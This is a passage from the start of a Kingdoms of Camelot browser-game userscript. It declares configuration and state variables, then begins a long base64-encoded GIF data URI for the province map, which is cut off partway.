var ENABLE_INFO_TAB = true;
var SEND_ALERT_AS_WHISPER = false;
var TEST_WIDE = false;
var History=[];
// VARS
var ResetAll=false;
var ResetColors=false;
var ResetStyleOptions=false
var deleting=false;
var Cities = {};
var crestname = {};
var Seed = unsafeWindow.seed;
var Tabs = {};
var researchLevels = [];
var currentName = 'Stats';
var mainPop;
var pdxStartupTimer = null;
var CPopUpTopClass = 'pbPopTop';
var KOCversion = null;
var firefoxVersion = getFirefoxVersion();
var TrainCity = 0;
var uW = unsafeWindow;
// MAP
var URL_PROVINCE_MAP = "data:image/gif;base64,R0lGODlhxgLEAvcAAP%2F%2F%2F%2Ff%2F%2F%2Fv%2F8%2Ff3%2F%2Ff39%2Ff37%2F%2F%2Fpe%2F39%2F%2F%2FnO%2F37%2F%2F%2FlPf%2FnPf%2FlPHv9%2B%2Fv7%2F%2F3lO%2Fv5ubv7%2Ff3lPf3jO%2Fm7%2B%2F3jO%2F0lPfvlObm7%2Bb3jObm5u%2FvjN7m5ubvlObvjN7e5t3whN7e3ubmjObmhNbe1tbb3t7mjN7mhNbmhNbW1t7ehM7W1tTfe9TchM7O1s7OztbWe8XOzsXOxc7We8XWesXFzsXFxc7Oe73FxcXOe8XOc73Oc7XFtb69xdHYAL29vbW9vb3Fc7bGa7XFc7W1vbW1tbXSALW9a6rCY629a6yurq3KALXFAJjCWq21Y6uza6W1Y7W9AJy1Y6Okpa29AJ%2BtY621CJytWq21AJq9AKWwG5ucnJylWpSlWo2oUoylWpytAJSUlHyrSoyUlI%2BcWoycUoyUc4SeUoStAIyMlIyMjIyUUoSMjI2gAYSUUoSUSoSEjHuUSoSEhICEe3OhAHuEhHuMSoSUAHKOQnOMSmKYNHuUAHl7fHOEQmuSAGuEQnOMAHJzc3OEAGt7Omh7Qnt8AGN7Ompralp7Omt7AGNzOlpzOltzMVJ3MmN3AF9rOmFiY2trAEp6AFJrMUpsMSx%2BG1JrGVlbWmdjACh%2FAkprCEpjMUprAEpjKUJjKUJdQkpjCFBRU0hjAEJbOkJjCEJaKUdSRTpaOkJaGTpaKUJSOjpaIUpKSjpSOkJKSjFfBUJKQgB3ADpSITFSMR9eGDFSIQhrCAhrAEBBQzFQGTFSCClSGQBrADFSADFKIRlbBAhjAClKISlKGTg8OQBjAAhdCClKCCBLGAhaAEI6AClCGQBaABtKCCFCIQhSCCFCGSlBBwhSACFCEBlCISFCCCFCAC8xMgBSABlCEAhKCCA5GSE6EANKABk6EAhCCCkxABE7CBA6ECcpKQBCCAFAAAg6CBIwEAA6CBAxCCEhKQgxCB4hIQAxCAIxAAgpCAgpABkZIQApCBkZGQApABAZGQAhCAAhABAQGRAQEAAZAAgQEAgIEAgICAAICAAACAAAACwAAAAAxgLEAgAI%2FgABCBxIsKDBgwBCHAqlhgDChxAhFglEkY8DACkWhnEYsSNBG6xeCCSwJdShFCNLnvTIUuAhOQOnUAw0x%2BELSKG2tOyoQU4oSD9GjjFZQijRnRGLXArF5iKALTPlOLSBcwrSg0qWWhVINdRWAF2%2FXjXIgU%2BoQBoEpph5SKQDn2jHQpwSqiiAH5cuKRmIV6%2FchxouqRH4YmYglA7M8onw16AaiofCCFR6KejkvJb%2FEngc6JBOAmwg6wSQtXLjggTC%2FBQJQEOgUHKcuobt9DRXnBsBEJADeStdSDZsC1RyyLBIhQw5Im%2FYmLhhlBMrXswYKrfwgQ6GyWPFj8%2F1iJf4%2Fq2DJ06DA2vwuMO8%2FsIaP8th%2BLlaVx5A%2FPn1hRMI5C%2FUQFfiyWONAxqIkw4u%2FEhmGwGs6BOKOPj0AIAc%2FLACzzAXUciKPBgKpwQ%2F1nAHiUDD7LMOhwSEQB%2BCYl314TAsYkQeLvvslcKM%2FOxlW3b0hHIPLg085Y88J%2B51iD6s3MMKR8LdiI9IL9BjzTD4BPXCPVNW%2BR0Ah%2FwzIgBsDHliUJfgwwo%2Bl1ynATz4nJjmD%2FgMYw0%2BwcEpJ52NaSBPm%2FSMqCefIxahj5z0sGYbJA6us44GDNLDyj6H6OaKo5BeZ4OUrvwzWAr40LMOPYEAMAU%2FuIizDkq28eHpOvi8R4B2%2F9x5l9123TUWyKqtBhfeeOWdlx4%2F631XRD%2BSsbJObVsSRIA1oTjQwEVK9KNTqcj%2BFQY9ewa17DCk9WPVlN2OdloIVKIpkAPpQNLAs0%2F1s9eUTP5VQjqh2tAdAeLg0m4R%2BOq7hbvCHSJOCACEIk8Eegay7kVquJpvYyURoAE9aVJogwPrsDIhPxdnLFwIXgEQCD8oHbJOCM9KLE%2BadXB8HYP6yCNSIPikoGeaNNu88ndK4KNPpABcUl7KnEZ6SM3C2aDPFgQ4cBEk9GhQNABQS40P0HL1sM8Uz16k9RRNX3SJPFLrE6ptL5gNViAh2AvT2A64HTTZwo2dVh1WFcFPEf4pA8BKOgTIvaDTL6wT6bDFrkMA4n6nU%2B1OYb8AT6jLNstutNOK83hjDQcViD6GJjtQCBxewjYAfLh8NKqnvURhUKSnuQI%2BaO38Au1Js1JEOv4BMDsul%2FCR1upzp7WjQ0TwM0YIV4PFjxrMRyr4aQ0wBkCpgZt5SWxB00OwsZvvpAEc9%2Bhk9%2FXiEHA%2Btd%2F1AONF80EC3F3AhnudGutA8mTjF1ljDYOOA4D%2F4vUXDaQrf7oZhjjkJ5JoSeZfOjrNFvYRikvkRk66yder%2FtevxoSBghYMgH0cZEHdgAtjGrPNFp6nhtxAcGMveKHFbNOAfCmBD8GZEJouoRMHPOxmW%2F4SWFrY8B6R1axzIgPdoTSXkNKdrmXBId53Uhec1ElIdASBE7Pi5IDPzYwfodOMfYo4tRJczYyR4tSXTuMQjPVOCfsYRijwgQsCQOIeRdEf62wTAmss6gX78A4g%2BfCCWsVAbd%2BRQz9gskJchIKCBAjFogpGt8bI4R%2FDSAv4%2FLYoY2kSHsbj4zqWBgAfruNBhWKc3gaDNnpMIQz7U6BDqCWnICkwSLa5xDBU5Kd18G48KZiCt0QlLeF8jhUICgS%2BuLWt8zBzgH85EjJrJU0E8aGDNeSWbdRgIlzQo44NKwIA1NCPH4yBH0AY595sUyApzWkvZQrFMJ7nAHj4RwMeY%2F8PPhTEh31UEYxURJ3LGqO00WhxjhjyYhLDeJqABhSL2LnYOP1RBD4oMRD7YKi1yIiPERWNeR7t6HcwcMpzSZQP%2FejB0fKID7vwcU7iVFqoYhBIQNYLkcJR5CXaaAOHHAKMlwAlJUMpFw38QBxL2iT4PMlJ6y1oLVUKwAsIprRDAEF5AFglDXGBi55U6VXpA4ACsyMOW4b1NFPAhxJCAI9LOIAAU6VfHaJlFWGKK0%2BsmU8fn4khcG2LgDsJgUgIgItjCVY3hQ3Bw3yozdOowR%2BhEqYS4iNOcv6AsuoU52kMeLIGgOuwnrWGijS2phQas5IOBSMUUefP1k2ylBJ97A3%2BL6rE74ShH%2BmUIkRLSbCs%2BmMKDQsO1HornPgEBYiArIMDbBfIkZaUtwKZgj9mKxJJErWA2kknANBIvzBooHk%2FeN79%2BLFGB3xAIGko59EIxj65HJZq%2BNAAJOiGwfmmRU6AvYoDYnCRQl5TA0G6WSFhIswWjaWQ9ICHPOhBjx9Isn%2Fc2iS4bBOKfpyIHmhKkUOiF17J3FazmzWeHrGHQvQ1LZ9FFbH3NGC8S9CjBBisZ%2B%2FQ6g%2FJFDIM0dpLP4MJsH5qFCnLsoZAHkQg4xmrj%2FoKwT3WyEZmDeScQVmvcbmEtL%2F4ME3n6m0R%2FLGF%2BEjojsRNGj%2FQAs3dPmUfYXDAT1%2F%2B0IPuFGgY%2BZXLlK%2BXjhCQU5y4qPOdnds7NehjCg4oUwiiBT0UNyaS%2FDiEDX6QgiBrIKD%2Be%2FRAT1MEfIijCD%2F4AQH4gI8iOGBDGvjXFlKws7%2B42AZ9TN9tpxClEa261WI%2BRE9%2BSzpIOGBUasBYV%2FXITjXIAQ5zPEQIKFQEG%2BCO2MY%2B22mUIAc58IFDSjD2IRxw2y3oKRQaMFiY%2FyLJqQ7wcz3QG0zALe7G%2FC0Fih1GA0KRDnSLA85Hs8GHWHmaEjhKA3dOgT4goQHs6Zvf7W2dPoqg2CXhQrQp8JiLeXzXxnCK3vYis5AjroEyyyVtCnqKPtK8ZnsJD15bsmPM8GH%2FYNH1Wx%2Bj9I76Rh5B4ajhH5Ypgjzk4SCHyJzmoYjzWK4tEHK1CR8wWXfM5JGZxoRXH%2Frgxz8ilVZ57AMSDmn603W%2BE1z0o1X9iFoKIMQqyTgAF51aRw7lYoN04GPBVuk3Pu6xDpGone0%2FBvIh9gEPCl4Eo6xixUVg6XRl368fKOkjPiwd%2BDkRfksO6JNuICEeB2UoZvoI1ml%2BMPOZi3PrgxctRiCED83%2F5ebygEdQQC%2F6zQ8%2Bk%2FeD%2FE6TuCcFfW5PDf9LCuYU%2BqBM4R4zFztYPkXH8F2lCP%2BIoMj3ZJXhk3zZwR%2FIyVOum0uwXHQEUIIaxm7mUgI3M9FXQwySVQIl%2FoTyBWMA9EDAL%2F7vLG7sGgDu2G89hrgjZdBKiL8SWBMDNSiBSfW%2F%2F3WAIH8l8Ks1W5AG6%2FdKe%2BReXcY6DnCA2KGAwmJ%2FTPIDalB%2BANADagBi35ECSiAbXUZcoRYG27YgRcAai%2BOAfFGBW5ICYRAGrPMBYWBto9OC1zUWKKiCAzGDrBMCMLglFKh%2Fk6EGRVcEPrglHcg6L9CCxIWCW%2BB7V6EB3qcs0jd22Ud97tWE2HF9AxGF1ZeFWriFXNiFXviFYBiGYjiGZFiGZniGaJiGariGbNiGbviGcBiHcjiHdIhFXQSGKSB5XKgG7rdbwvOFd%2FiFU9Bye9iHEPWHXvgC%2F%2FTWhfEHhnz4hY8GhoMGhjYghVsYCEoIUZiohRpgWl1oA1jmhUABhqwQg1nYiY6YcV04il%2FICh%2BYhUXAZHu4iFzIil0YAp7IhT8gi1uoBrSohQySiVhUigsyBZERPqj4hVQBhrbYhdgGiLnYi6rIhYdQdFwYCq9YfT%2BANV2YgmBYjV8IMmC4jWDojV4YjK1oikiROtagD6tnEMnohcv4hc14jepoZp%2BWit9ojVuIjV9Ijl9ojl4Ijl4ojv%2FIjVwokFyIjl5IjHkiDzk3MpbYGtGohfMoivyohc%2Fohfn4hS20j2Doj14IkF4YBmogAAIwkBlZfQY5kgi5hQq5hQzZhf8O%2BRfhBROYcxAdmYi8qIWKRor3uFs72Y3TuIWHcEVeuJFdSJJE%2BY1IyYXZBoYqVY5FqYWsgEs0GZQeoQQ1llX1UwJFEJZhOQXDIANmeZZomZZquZZsuZZb8AltGZdyOZcywEN0eZd4KQOPwAN52ZdtyQOt4JeCqZaBwAeDeZhmSQhbgJiHeQpFwJiCGQaXAJmCaQZmQJl%2BaUGYmZdKcAqbmZeS%2BZl4SRGieZetwJelKZewoJUdwZWSUW5FcAiyOZvdoA62eZu4mZu6uZu8uZvecAvu0JvCOZzD6Q7A4A3EmZzKiZtMYAzBuZzQ2ZvlwAvRWZ276Q7I4AzPaZ3cGQ%2F%2FYAAK8cCd4qkOvFAO48md2UAM23meyxkPgAAI4cme0Gmc2SCf0Tmd9gmd8UAKbRCf%2BUmc7uAM2vmfykmdBJqczSCMEXGT3VKVABAM6oAOEjqhFFqhFnqhGGqh3mALGdqhHvqh6AAM2QCiJEqiERoFxhChJbqiGVoOt8CiMIqhxeAMMVqjE%2BqdmuAONmqjt1AOO1qj2QAMPxqj7gmfQwqjInqkLOqiSrqi7qAJYBAPTVqixVAMU1qiPXqlH6oOCTouELlpk0YQCdAMKqqlHbqhZvqhSZqmHYqiZcqmFcqkcCqjNDqnFuoOYJCjdmqhWbqnFBqkfkqhRSqlgSqha1qo%2F3JaqE8KBjpaqOggoI4qoX0aqFyqoBExMu34jgUxpm%2Fqp2gaqYdaqG7qqIlaqDMaqXiqp446qYEKqI46qKA6oqT6oo66qI1aqJAaqay6p5W6IFsACbmGEJwaqZ%2FqqKEaqKOKqLTqqKdaq3l6q4G6q3vqqoUKq8Yqq8qKqlAKrX6aq6vqo4Xaq1k4rI5arIV6rH6arIFaqoHarIr6rLoKroVKrYFqreeKreu6rIFqq5HqrYUqrXMqrtVHroVqroGKrnuqrn7Krn7qrvsKr98aqfTqp%2FZ6sPi6sPrqp%2FzqqP4arfLqpwJrZgQbqAbrpwhrpwq7pwy7pw6rsRD7rx%2Frp%2F8Tu6cVa7IXq7IZu6cbi6t1GrHh2qXjSqbEyqGxGqnokLJ2urJ22rI6%2B7IeK7FC%2BqrvSaj3GqlKC6c7G6gd66cAC6chu1sj66lEe61Gi7RzerVwyrR2mqrcuqddC6cza6c1u6cnC6dom6ZZ2609C7OO%2BrUQFbZ7WrJ0e7MJm6KzarRqO6dsG69QG6lza6d1y6Z3a6Z5u6db67Yxa6d%2Bi0WAa6eCC7mEi7KGm62RmrhY67Rcm7l2Grdz%2BrhzGrlpOrlaWrl2erl2%2BrZpurmi07lz%2BrmvG7pzarZ2m7Msu7cuq6p866isC6euC6ewa6aye6W0O6e2O6e4a6a6myy8C6f%2Fvuu8wAunwiu5xLu0xtu0yPu0yhu11Tq1RXu4tbqt%2FVq%2BmNu3QDuwQluuY1u1kRq%2BsTu%2Bc2q6bLq4Pjuv6luv7Eu27quo8Mux8nu7quu19Suy91uw%2BWuxZTu6%2BYq4DXy655u6jSu1RorApKvAjBq%2FRnu9Wpq9W7K9bNq9bPq8Zsq%2F0Ou%2FabvBAYy685u%2BjnvA%2BjvC%2B7rAPHvCD8ymKvwdLJymLpymMKylMqyl0XulAIy3OOzAH7y%2BIdzDGfy%2BJczAQky%2FlnoaR2ymSWymS3ylTXylTzylUUy5U2y9Q8ymy8umzfvC39u%2F2rrFQcy44RoMCaCFYaylY6ylZTylZzyl%2F2ncpGs8u20MpyispXGcpnOsxHU8w3fctrVrw2zayFOqDnzsxxNMshVssxfcqUlLw2yayNK7yJn8xmn6yGYayWQ8yU5sypQLxFqLyWmqyU3KyV%2FcGH98pYF8pYPcpIXcpIespKg8pQKcvAS8w1dswQn8w3h8y138s738F788pcE8pcOspMWspMd8pMncpMuMvs0MwlQLzT6ssbast9VMqREMtp8stkbbzUf6zUcazkM6zkpazh6sw%2Bjcvuuss%2B1subhsprqspEV8HdncpNvcpPY8pPg8pPr8o%2Fx8pP6cw%2BdsxeksytHMztPsznoMz9csFw2tpA%2BtpBH9oxP9oxW9o%2F8XPaQZTcUAzdECncUkbMnUe9BamtBHutDCcdJHmtJHutI72tI7%2BtI2GtM%2FOtNuXMUG%2FMwePdBrW9CX%2FM4gG89%2FO8%2BBG8qDO8of3bA8rcyqnMusbKaurKWwLMiyjMa0PLtWvdNYzatazblc7bleDbpgTdXki6pljdBn7cgFTLE8rM44Lc06DafVy8iBvcnBUNJjIdRDStRDatQ2itQ2qtQ1ytQ76tSMDdWELdVfHdZVHdIGPdeaW9e7e9e9m9e%2Fu9eH3a5jTc5%2F3dONPaVpfaVrLcxtbchvLb1xrdiz3aQ%2BPaRAbRuS%2FaOU%2FaOWXaOYXaOaHaOcbaOevcqgTbOFPdX%2FsU3Qpn3VI53VkH0Vyb2jy72jzR2jzx2j0Q2j012j1W3W1y232T3afI21wc2mi23d1uzJpIzX9dzbhIzBGKvBft3BGt2qg43doq3XpK24952m%2BQ3f%2Bx20%2Fd3a%2Fw3bA166w43RtX2lxT2kuT2lu83NAA7Ov63MD26mEQ7YXszfQ3vh%2ByvgOEvgzmrgNL3RUd3R9L3dpZ3Y%2BL3hR%2FrhO8rJfUzhL37TyCrjpUzj72rjT13TOY7kM67FPg7hQD6kQm6jxw3GrM29ru29GD7lzHrlnd3hU5rlNhriTTriEF3i%2BXzi5JziWrritt3iRo6%2FMO6o6Q2j682i7R2j783iUB7a%2FzrO4PUdwHJ%2BpXTu4bet0J0MZAQQ6QTBKA8x3jZa3jZ63jC650sK54hM5tRt5sTd6Eqq5krK5irt5hTt6Rid6FO66GdO6sat2g8BY%2F4jDlYBMgJigWLa5S385XQc5kuu4QVe5YKO44Qu5cOe0yb83XR9zR%2FiSK4AT%2FjABtaQDqZo6TWK6TWq6SzK6Sva5yv65zAa6HU%2B6Ape6K%2Fd4Pbd3XLt7Kl9zXJAD40mEEAkWQdBAL6OxMAuycJ%2BtqwuzqDu3qKupGgOpAku3wu%2B7oeOt67epLA%2B6nbeEmUiDuJwTWnjHeE1GGHjNAQCoeUQ8iI%2F8iRf8iZ%2F8iSPDtnAoSjf8v8u7%2FLoYAsj%2BvI0X%2FMi35zqYPM67%2FI9uvM%2BX%2FLoUKXo8PNEH%2FLqkKc5X%2FREfwveoPQ%2Fr%2FIs7%2FQ7zw7vyQ5Sv%2FMxP%2FNXb%2FO%2FufU6rw5QmvRe%2F%2FJBb6VjX%2FM9f%2FYuv%2BW6IU9hAAnE4l%2FOMweiwgp2f%2Fe2wAu3sPd83%2Fd%2B%2F%2FeAH%2Fh%2FHwuxIPiGf%2FiIfwuEn%2FiMz%2Fh6bwSZoPeNP%2FmCzwuFT%2FmYD%2FiLn%2Fmcv%2Fe8kAWSIPmdn%2FmbP%2FqYX%2FqmP%2Fm8QAd0IPqp3%2Fio%2F%2FqJH%2Fuyf%2Fi8IAlZ4Pq1f%2Fi0v%2FuCHwu67%2FuAzwuVUOSQU0oZUwP6oPH1E%2BnOLzEQKrH9HstGi%2FPsnrb%2BVtq3SK%2Br3hDfc0r1gMAOyt67Af%2BjYA8GFY79kQoOBw%2BjvLwTDRBtGeSKikdXB6HtMcrtMertKwruJQoQ5W6hI1jQ4EGECRUmLOZs4UOIEd2B0eQu4kWMBW%2BVy9gRYjZgHkUmjAcIULyRKQsCy6ZSpUCXKd1pAmMxpkhnDm%2BK3Lizo7pmDgAMJVrUKAAH4tL9UMNPDQBc64qEkhfiKIAEzdT57OjNFteOLMFmjGJs61iIMNFGbLgW4sSKbh%2F2lKsQZF2FJU%2FiTSiW70G1fwvOrCnYYE7DBukaBir06mMARcThuwepAYAa1vTJC%2FM469nEXhOvbDkaXVnQggMnbjv%2BGq7NxIsN3x2tF%2BVov4lXCyYM2zBi07L%2FNoYM2YGNFEWPW%2FWs1bRo07kTox69W3DrxK%2BDcxxNO7Ht6KV1D3RN07dg4KOF8yVe3P17op%2Bffw1v%2BrTZ6uRHYzesXT33xLwzDDzcxDPMOr56My292AAUrD34ImwuNcGgK9A%2B6sazjz%2FeKDrvr%2FX4ElAwAhOTTjX9%2BjNvQZ3%2BGw1CCWOMz7nRLDTRQMMyPDBFwzj8y78GTRvxrxINO%2FEvBPFScDQGDQuxLhhljFG%2BGum70DQdUdywxf483E7IkGoz6bYbTUuyriUTa1KwJ%2BWKUsoIqQzNyjKxxE9D03xM0EsXuwvzuzH%2F68vPtDR%2F49JJB4cLCk4p5TTMRiNxFCxLl9RxJx5M4%2FmQoDPr0vOgS%2BM5K1QKMwISUTBNKxIjUlM6kq9O3SoUvUPZTJS9RRmdksY57XuVL0plEiaPKq64goxN1Ck1Vrc%2BLUgdO6qoohR3uumiWGFKvejUtTKFrc2EtF2oVYOGfNatVSPqpgxsxYXo17qYRWvWkdTJVFN3CVozIXJvEq7fsd7UtThHb1L2YIQRRscbYtzJN9yY4D1I4ZuCFckdQ0RAYGOOg1jlPHnRcpYgdWYwwIA%2F4nlGAgMQkOVhhbgdqxs3yCBjkbPANcjSbjJSxxCbJ0nNXHTcCSecbgP1uZsN%2Flr2BOa%2BJIWVxx9XVMnSWuKwmYw%2BglF2oX13ppmMM7CBOiLZfra5lLM9EnjgCblyp48cgrD77rtzICOcJGgIIluMlK0lYqkRcmeTHHK4YieLO3LnD44RkCDyE55JLeSxRkZHnRw2JkTlDRBQoJa2DZJZ7k02NkCEbrbSmWSagzCH1SNOLoNMdIZU1pAZAB8r3YfU6UZjBNgeyS%2Bo81X%2BLOu%2BXqh0fq2uFx03Jo%2Fcgi7CETfsZ6WxoOVUoFco7RxOTnmtt%2BE%2BqmCX4rmi5cgjNyCHcDzY2JNNEVInmCNmIHxbQ5xsBuJDSOMClwrriaBrmzgCx64AG3WwgxfuoGBq%2Fi7lMAo6zF6islQGSYYpCGIKNBS8hk4ueMFndQ4Bn3tG6EZHwNP5xB1ViNwiLPI6ddSiBQZogamcsDE34G5EwmugBHwHFuA9b3gbM97OPPisJwLDGyhpnahMV0EK9sxhOxNVFVNjL%2BF1g4KBuVQ4uhGOCnJReJYiYNGkNxIacsx6CDBAFfLHPZJhw34ICN9OyGc%2B3HElfeorCvtUEo8uiE4BCuCYAhjAyCCEo2kIwF9E1LGJ7%2FnPJRIbjCE2NsCK3UkmUNiYCGoxDzYGoWUt6FnRuoEIMTzBDZvQHkHCsYg%2FEEIYf4DCH7CxiT%2F48hmEgEIZNrG5ZwRzESTzRDCb%2FohLPdDCYZuwwxN6SYnNbU6FLHQh6UYSQ4O1MHJBcB2ALAVC0MxjEp%2Bk4BU1tUWCuOOHCAgiydxBjmWksWjC2JgFnmFFJCotcEssngUXkYQncAFpm%2FPEE56QPXQQgxZu0IEJgtAFWdhEHWdwaCkmkYQT5MANrSPZM8gQhBMEIQ7P0KgwTnqCExwhDtjgRTw3UYUZnKAFUEBELZFJ0Zi6wXLffGNH4pEHjt1gEbX4wwk4RgkIXvAa1wAVFjGlx42lQlP4mhgFuQpFDaqDF%2B2A58%2B60IWnQRGdlcoVIQnGq3DWQq6TsF4f5FoLYZgDEXowhOU26DAOAnQei%2Fgkpuxp%2F5OvHrZolloGOaK6FX1i7JNtNIgBLSlOes5jMKWYpTBItokWxG8GtXCYMBjQshmobhNJaBkZRAA%2FBNhRGAowgBGVpUoDkDOHdGQALcyRhPgh4Aja45znQCc6b16MT2iJRx82xkjJka4nypJFH6T1B09sTh2pSCQCTGCItG5lE8SapU%2FlCUSUqAMbk%2FBCE8qwiFw4LBh5YIDk%2BrAIswV0L0sjXhPj6QmOUQsd8ajCyZJAQT3sUY5u2ErJWqYC2nJMB0hzxyqcGjkTpMJhviAebFlQid0tgI6whUKDa6GC%2BKkguY4r6kAvPIRwiGoetbDAxrpgE3c8YxFkqEI0tyi8Rf4YYhPPsAOypLHHVKTCDV1YBElJFo5JxKELhhCGRmthCEPU4pZN%2BMIkfOqJRSzCd%2B4QBiKuZYhg5O8ig3QrVuBqMGXFIxjWmwQqlRWOOHihDFUWxlkJgY0%2BJEFvGf3ZEDbmgS64QXvhIAROZ8CFPEjjLOoIhyGgMIM9K6IJXRDa5roR6BlUgRC1lCwCQBkTy0JEHbmw3iZ808EGI5BjClYBn2tMOXTMs5S35qM7grAxQ6hsjx6QRjwIsbEdcKPAhw7dxmxY3BUe94XfXC5aUouAMlz7dhuhdBUmd7KNQSHGUICtAY7gsFoYOnIt0HDR5hnEHIaWjoc2xDz6ANusUv%2BWJAJdM0H9SzIdbOx2wrvwJOIhawRsIAgKDja0E34EeSPAhuFQoQeOAINPxjiOOciDa%2BmIhHhgQ2PY6wMp6TgJo11bBUe48Ax8aqoWb4uwTISNO%2FLQ2Qb%2FgXgbk0AXtFsLOopA3h4QhsYUcO2NtUDAOUR6wvuwFQKfLAgB59hwlVU%2BlN0mDwpGgAXi0EY2u9WQBquF9WwIu0l64uB0bAHWN7aBUsyDtRwzwAbMqELYtsCv3fi16jzwWgMMXBjyBncOLFfqU7sk1Q85XD%2BPqL%2B%2BV0AP3VhEjesYD2HcWgKE6EMe5M7zRYRDFnu0gz0gF1t7pI5jm%2Fg8AvRwDShYQAL%2BhjhaA2Mrqm1Ke8WOq7bcAIwABtSiDBs7QTd4UY7HtUwCiWOkAbpgD3LT%2FQjxkEbEeW1KS707Ht1AseQqYD27%2FwHffNQ3QpKoEOH1l0LGTjoa14mAFqARuKau8jPmH39oe0AW83iGCTZW%2BpkzJXtABxrYGJTru6%2Bzh1Q4gjNoBHdIBeILH3twgypwg1qIh5lTgWewh2e4NlfzCHq5iOYiPif7oC1yh2PjOV6rAsGZIzq6gm5QMAVoNvgzm26QNwagwTy4lDjqpzkiBIehupR5HI6xAF5DuXppqza7irGLiRwyO40iKLWDQI5pAaQLgnmoAhHjuR56H8mZgRloPjv%2FEJW5g7%2BmKwP%2BG7ocCJ06uhRPMrXyuw%2FKKjULeLydKbuNQQRiUId5SEEPwIZnuDU0xKD5mz57mScumIfMQ4ATQIfu2pg4QAeN2QBacIhuWAV0eIZN6LsqwD3jEqdpU664YK4r2JggcAdZMDtiQD6TKz17IAQLwLQcGj5GnAStKkXJibRJ2KMhOEQgUkARkAAVoAVbGD3JWYVkmpzNm4QS3InzCxd%2FoxB1EIZmKwV7iKMu4L9mWwSUcAdfsB5qUSEo0Cx3sL08uEZTrIVSkAVcPAN7sD1GTII%2F8IV22MNFTLoq6Ct7sJc4cgJZKIVaiCMyCCSJiDmJoEVyeh5q%2FKRU%2F3gGXEQAg8NDBFCBReACT4jBpEuFbiAE6zlHN9gYFdDIPmCk4iMwjiGDZ6gEFgg3URHC7SOeKhAGYWAtA9AkkQg7QmrCSpHIs%2FM04plCjjmDzemuHBAe54I%2FmVQHN5iBDViEebCH7kqCGbMeO7CUPtjCMrAHpGJEYZgHY5SAU3rDxFOJxXseifxAg0Ajh6HCDaCpzVnE0QlEYMOx%2BauneOACG%2FPEBUiFgPOAGjsC1TuCEnrALsgBXrs9aOMm5IKh3tsJ9SIeQrCHeOi7IDg%2BdzC5DTiCPEiFKrMIdWKnaiGeOEClz4yuedA%2BdMCGYPAFb6iERSCeRbAHYZgcfyLIm%2F94Rv2JRsMxuTJAB6eSAK2iwjo8C%2B7bmJRRoTEsGiHYmHPsu%2BBCgCCIB0yKHwnYARBTBzIIrg0gg24wyec0ACiwTcYzyLeYv1Mcl9MTAWHQFG7YgY1xgnjAQwlgPYfBKgSoN3t5go05N6qrJ3TwQHScyM0hhjNgSXUQQnv4PdahoGCogjw4piR0jCVkwjfziSd0tij8ybVLOEmLhzcUAWwYrMmCrBzrhlTog2tLAnughFIiLnSQt6ycvyt4hlqwv43pA3sQyzgsS%2FSbzRslE3eYhBbogk5Qh1U4NLdUB1Cs0VszBLpErwHDxS7QlI%2BMLfupAlI6gVacKjv4Nvjrvk7%2FTEzdY8xRBItSk4A8MISD4rlKQL6Z4xgGaAFFs5SZ6yElrbFpIzgDtAftU5ZJqIIWYBmOMbhv7Do7dEZ%2BsyTdBJX3m4H3K8oKY6Th9LTu%2BxwVclLlZE576DsPUAGYaoEWUIESc4da4IKd%2ByTtmoQhoEE6coMA3QBPPQEVUAETKAM1ixnyfIh4sAOQbMY4s5c42JgkuI1r0IPJwkN%2FajD7XAXIOsoJuzARmNUW2MYABSVi8AIDRdCtVIFaspd2itAJjRu0uFCJy9D72dA%2FVJZVUMb1nDmbRIdFQKl5E1Z7CFZGJLV3e4e%2BW6RFUh0uyNHJCiV9O9CNoQExOpjaWR3R%2F%2BO5Vagpd%2FAEdpVLBECEJ6UnlHCfvDTSydkARsIynpMcWbgGWqixBbBAdaDFMM29JSXTW00Jgn3OjWkCdigaQug%2B6RuwOkWmbmowdOg%2BSuBT9OqGBjqZ5bs1QqXNQ73NRFU1glqFecigNAqH0JIAjEOAPnAYgiIEVIoHT9hCDbtUi3CH5USAc8TFJKA0dEiFGkWaZxCGTsAGT4gDFSqeTFTHZ5iEMpC3GcBYBCixo5GrM7qYXF2IeDg92xqMMgiCPlhPez0wgijWY0VaZUUyyHrDZ4VZbAtQJ7CIa81W47SHAp3Ibn0nl1XCcJ2ROAwXnjRXSkJXs1k1pMVAVN0cWv9EAIujOhWt0hOopXjQT3pSB3mTgA0YXg%2Fwy6zUUYF1CRTsGGEIB2yo3U4kKCSwhWrpuwFaRLAclbq8WCm9DaQLvlqor4JFB8i13W6QTNtL2U%2FcWWorUwtFOJg9AbO5FGHgrByYI9bL2TvdGEpIr4VEgE0AWnrK0ZYRAT0AsWs7WkNN3YPAzYkhqAedBAmW4FIYMHt9O8Bxh%2Fk7gVLohlpQIRjQHrDNVLK1h5mzALXrhhmwABXoqxOYnEmwB3ugsY1hKtkzgQ20h6OcAXeYuQ3Yv2dQAQtogT9oWcMZXPSTSHgrmmewnzqq1xFFB24Qg43JAVKV3M2xzw%2BMhyqVne7%2Fi4NU8ARP2IRS4EzvHMiIwta%2BbcnPfT%2FWUZZnKANC6ISFchvTPV03Y%2BCJWV3Y0VAqTNcLrUPZhcMcqzEJ%2BIPz5VUEUNH32wCWqhb%2Fy9z5K4NweAZsqIVgeAYxQl5UEyWXNbmuawEFE4HDu2AWkFcDxDxDTi4NhlK%2BnVIL5hj%2FCYcLQ4A4iIdrqIQH2M9F8F3EVFn2FUUjBsHu8oAyOOZj7sEmg4IcEAFPyIcZIx5EMOGk%2B5priyRRwUUQjYd3C1AyaIdlCIY9ikhlVAZ1mB39Ek%2F0I6jnHCByFS6NQjgJ8ADrsQBXgzZMFVvmRIlrk4AgCF7Smj8LCAKQQlUaZkS7%2F2m2MQyHa1O47tuA3dsWJEY%2FeIyDnhEGdZO40ty8S1mFDBC4qYQ%2Fc5hcYeVDbIBRe5i%2FcbQHvhuCPcvCjUHjzl3jl%2F2DeVhXYJuHeRC%2FhGvGwLnj09XJq%2BFjnzzXP35dZF3PN2SlZygF2gyGfbS9Yf3fI3gG%2FuGYrKzSGTjfZ2gBEQiCVJgHTlY8T54eUI4cERCwzcFL1eG5r5vGCGPlhL2dASswA7iC9JIF1cHrGYIf0sqJ2lGduqMj%2F3GwrFuZlnmZ9h1m%2FrIxycwU4DXF%2F3ywNC0Ddh1kf04CdEhBU0sCpLMDCurm7jJgPYg4g7tHHdCBiI4JBxYbVpUfUFIHeP%2FsyaJBBK5DABEwuM0xGQMAwqLBrTHcLsIr4GfDhr4DN0YEsR7eI%2BROAuIKBsLrJyQEwYkOl2CIZNxmyqq7MxVSgCA4gj0i5StGgKLMIwUTqe5jgLB%2BUyjoA%2FdMuGeAaQSQaTUOz5pGib6zgCM4AuuxI3D